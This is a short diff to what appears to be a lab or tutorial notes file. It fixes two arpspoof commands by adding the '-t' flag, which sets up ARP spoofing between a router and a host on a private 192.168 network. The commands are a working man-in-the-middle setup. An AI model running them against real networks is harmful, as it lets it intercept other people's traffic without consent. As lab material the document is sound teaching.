@@ -54,6 +54,6 @@ Router IP adress ---->
 192.168.229.2
 ```
 
-sudo arpspoof -i eth0 192.168.229.2 192.168.229.132 
+sudo arpspoof -i eth0 -t 192.168.229.2 192.168.229.132 
 
-sudo arpspoof -i eth0 192.168.229.132 192.168.229.2
+sudo arpspoof -i eth0 -t 192.168.229.132 192.168.229.2
